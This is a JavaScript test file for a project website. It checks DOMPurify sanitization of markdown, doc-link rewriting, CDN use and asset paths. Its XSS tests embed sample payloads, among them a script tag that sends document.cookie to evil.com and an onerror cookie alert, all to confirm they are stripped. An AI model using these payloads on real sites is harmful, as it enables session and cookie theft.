/**
 * Site integrity regression tests.
 *
 * Covers:
 *  - XSS hardening (behavioral: DOMPurify against real payloads)
 *  - Link rewriting (behavioral: resolveDocLink with real URLs)
 *  - Source invariants (structural: no CDN, no stale buttons, assets exist)
 *  - Tailwind CSS reproducibility
 *
 * Run: node --test site/site-integrity.test.mjs
 */
import { readFileSync, existsSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { resolveDocLink, resolveImageSrc } from './lib/doc-links.mjs';

const require = createRequire(import.meta.url);
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');
const { marked } = require('marked');

const SITE = resolve(dirname(new URL(import.meta.url).pathname));
const ROOT = resolve(SITE, '..');

function readSite(name) {
  return readFileSync(resolve(SITE, name), 'utf8');
}

// ─── P1: XSS — behavioral sanitization tests ────────────────────────
describe('XSS sanitization (behavioral)', () => {
  // Create a JSDOM + DOMPurify instance identical to the site's pipeline
  const window = new JSDOM('').window;
  const DOMPurify = createDOMPurify(window);

  /** Simulate the site's rendering pipeline: marked.parse → DOMPurify.sanitize */
  function renderIssueBody(body) {
    return DOMPurify.sanitize(marked.parse(body));
  }

  it('strips onerror XSS payload from issue body', () => {
    const malicious = '<img src=x onerror="alert(document.cookie)">';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onerror/i, 'onerror handler must be stripped');
    assert.doesNotMatch(clean, /alert/i, 'alert call must be stripped');
  });

  it('strips javascript: protocol from issue body links', () => {
    const malicious = '[click me](javascript:alert(1))';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /javascript:/i, 'javascript: protocol must be stripped');
  });

  it('strips script tags from issue body', () => {
    const malicious = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /<script/i, 'script tags must be stripped');
  });

  it('strips event handlers embedded in markdown HTML', () => {
    const malicious = '<div onmouseover="alert(1)">hover me</div>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onmouseover/i, 'onmouseover must be stripped');
  });

  it('strips SVG-based XSS payloads', () => {
    const malicious = '<svg><animate onbegin="alert(1)"/></svg>';
    const clean = renderIssueBody(malicious);
    assert.doesNotMatch(clean, /onbegin/i, 'SVG event handlers must be stripped');
  });

  it('strips data URI script injection', () => {
    const malicious = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
    const clean = renderIssueBody(malicious);
    // DOMPurify strips data: URIs with text/html content type
    assert.doesNotMatch(clean, /data:text\/html/i, 'data: URI with HTML must be stripped');
  });

  it('preserves safe markdown content', () => {
    const safe = '## Hello\n\nThis is **bold** and [a link](https://example.com).';
    const clean = renderIssueBody(safe);
    assert.match(clean, /Hello/, 'headings must survive');
    assert.match(clean, /<strong>bold<\/strong>/, 'bold must survive');
    assert.match(clean, /href="https:\/\/example\.com"/, 'safe links must survive');
  });
});

// ─── P1: community.html structural invariants ────────────────────────
describe('community.html XSS invariants', () => {
  const html = readSite('community.html');

  it('does not use inline onclick for issue rows', () => {
    assert.doesNotMatch(html, /onclick\s*=\s*["']showIssueDetail\(/, 'inline onclick with issue data is an XSS vector');
  });

  it('uses issueMap lookup instead of inline attribute data', () => {
    assert.match(html, /issueMap\.get\(/, 'issue detail should retrieve data from Map');
  });

  it('passes marked output through DOMPurify.sanitize', () => {
    assert.match(html, /DOMPurify\.sanitize\(\s*marked\.parse\(/, 'marked output must go through DOMPurify');
  });
});

// ─── P1: Link rewriting — behavioral tests ───────────────────────────
describe('resolveDocLink (behavioral)', () => {
  const loadable = new Set(['docs/faq.md', 'docs/configuration/environment.md', 'SETUP.md', 'README.md']);

  it('resolves root-relative .md link to viewer', () => {
    const result = resolveDocLink('SETUP.md', 'README.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'SETUP.md');
    assert.equal(result.hash, '');
  });

  it('resolves relative .md link from subdirectory to viewer', () => {
    const result = resolveDocLink('../faq.md', 'docs/configuration/environment.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'docs/faq.md');
  });

  it('preserves hash fragment for in-viewer navigation', () => {
    const result = resolveDocLink('../faq.md#where-do-i-add-api-keys', 'docs/configuration/environment.md', loadable);
    assert.equal(result.type, 'viewer');
    assert.equal(result.path, 'docs/faq.md');
    assert.equal(result.hash, '#where-do-i-add-api-keys');
  });

  it('resolves non-.md file to GitHub blob with hash', () => {
    const result = resolveDocLink('LICENSE', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /github\.com.*\/blob\/main\/LICENSE$/);
  });

  it('resolves .md not in loadable set to GitHub blob', () => {
    const result = resolveDocLink('docs/SOP.md', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /github\.com.*\/blob\/main\/docs\/SOP\.md$/);
  });

  it('preserves search + hash on GitHub blob links', () => {
    const result = resolveDocLink('CONTRIBUTING.md?tab=readme#dev-setup', 'README.md', loadable);
    assert.equal(result.type, 'github');
    assert.match(result.url, /CONTRIBUTING\.md\?tab=readme#dev-setup$/);
  });

  it('skips absolute URLs', () => {
    assert.deepEqual(resolveDocLink('https://example.com', 'README.md', loadable), { type: 'skip' });
  });

  it('skips pure anchors', () => {
    assert.deepEqual(resolveDocLink('#section', 'README.md', loadable), { type: 'skip' });
  });

  it('skips mailto links', () => {
    assert.deepEqual(resolveDocLink('mailto:a@b.com', 'README.md', loadable), { type: 'skip' });
  });

  it('skips javascript: URIs', () => {
    assert.deepEqual(resolveDocLink('javascript:alert(1)', 'README.md', loadable), { type: 'skip' });
  });

  it('skips null/empty href', () => {
    assert.deepEqual(resolveDocLink('', 'README.md', loadable), { type: 'skip' });
    assert.deepEqual(resolveDocLink(null, 'README.md', loadable), { type: 'skip' });
  });
});

describe('resolveImageSrc (behavioral)', () => {
  it('resolves relative image to GitHub raw URL', () => {
    const url = resolveImageSrc('images/arch.png', 'docs/architecture/overview.md');
    assert.match(url, /raw\.githubusercontent\.com.*\/docs\/architecture\/images\/arch\.png$/);
  });

  it('resolves root image from subdoc', () => {
    const url = resolveImageSrc('../../assets/logo.png', 'docs/architecture/overview.md');
    assert.match(url, /raw\.githubusercontent\.com.*\/assets\/logo\.png$/);
  });

  it('returns null for absolute URLs', () => {
    assert.equal(resolveImageSrc('https://cdn.example.com/img.png', 'README.md'), null);
  });

  it('returns null for data URIs', () => {
    assert.equal(resolveImageSrc('data:image/png;base64,abc', 'README.md'), null);
  });
});

// ─── P2: No runtime Tailwind CDN ─────────────────────────────────────
describe('no runtime Tailwind CDN', () => {
  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} does not load cdn.tailwindcss.com`, () => {
      const html = readSite(page);
      assert.doesNotMatch(html, /cdn\.tailwindcss\.com/, `${page} should use pre-built tailwind.css, not CDN`);
    });
  }

  it('pre-built tailwind.css exists', () => {
    assert.ok(existsSync(resolve(SITE, 'tailwind.css')));
  });

  it('tailwind config exists for reproducible rebuilds', () => {
    assert.ok(existsSync(resolve(ROOT, 'tailwind.site.config.js')));
  });

  it('tailwind input CSS exists for reproducible rebuilds', () => {
    assert.ok(existsSync(resolve(SITE, 'input.css')));
  });

  it('tailwind build script exists', () => {
    assert.ok(existsSync(resolve(ROOT, 'scripts/build-site-css.mjs')));
  });
});

// ─── P2: lang toggle scoping ─────────────────────────────────────────
describe('lang toggle only on translated pages', () => {
  it('main.js skips initLang when lang-toggle button is absent', () => {
    const js = readSite('main.js');
    assert.match(js, /if\s*\(\s*!btn\s*\)\s*return/, 'initLang should bail without lang-toggle');
  });

  for (const page of ['docs.html', 'community.html']) {
    it(`${page} does not have a lang-toggle button`, () => {
      const html = readSite(page);
      assert.doesNotMatch(html, /id\s*=\s*["']lang-toggle["']/);
    });
  }
});

// ─── Local asset existence ───────────────────────────────────────────
describe('HTML-referenced local assets exist', () => {
  const assetRe = /(?:src|href)\s*=\s*["']((?:assets|styles|main|tailwind|input)[^"']*?)["']/g;

  for (const page of ['index.html', 'docs.html', 'community.html']) {
    it(`${page} — all local asset paths resolve`, () => {
      const html = readSite(page);
      const missing = [];
      let m;
      while ((m = assetRe.exec(html)) !== null) {
        const ref = m[1];
        if (/^(https?:|data:)/i.test(ref)) continue;
        if (!existsSync(resolve(SITE, ref))) missing.push(ref);
      }
      assert.deepStrictEqual(missing, [], `Missing: ${missing.join(', ')}`);
    });
  }
});

// ─── SETUP.md compatibility ──────────────────────────────────────────
describe('SETUP.md compatibility', () => {
  it('SETUP.md exists (not prematurely deleted)', () => {
    assert.ok(existsSync(resolve(ROOT, 'SETUP.md')));
  });

  it('SETUP.zh-CN.md exists', () => {
    assert.ok(existsSync(resolve(ROOT, 'SETUP.zh-CN.md')));
  });
});

// ─── CDN version pinning ─────────────────────────────────────────────
describe('CDN scripts are version-pinned', () => {
  for (const page of ['docs.html', 'community.html']) {
    it(`${page} — marked is version-pinned`, () => {
      const html = readSite(page);
      if (html.includes('marked')) {
        assert.match(html, /marked@[\d.]+/);
      }
    });

    it(`${page} — DOMPurify is version-pinned`, () => {
      const html = readSite(page);
      if (html.includes('dompurify')) {
        assert.match(html, /dompurify@[\d.]+/);
      }
    });
  }
});
